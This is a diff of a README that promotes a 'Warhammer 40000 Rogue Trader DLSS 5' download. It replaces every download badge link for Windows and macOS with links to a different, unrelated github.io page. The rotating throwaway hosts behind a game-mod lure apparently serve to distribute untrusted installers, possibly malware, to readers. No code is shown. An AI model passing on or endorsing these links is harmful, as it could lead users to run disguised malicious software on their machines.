@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Warhammer 40000 Rogue Trader DLSS 5](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_WARHAMMER_40000_ROGUE_TRADER_DLSS_5-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Warhammer 40000 Rogue Trader DLSS 5](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_WARHAMMER_40000_ROGUE_TRADER_DLSS_5-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Warhammer 40000 Rogue Trader DLSS 5** is quick and straig
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-880E4F?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-880E4F?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-880E4F?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-880E4F?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
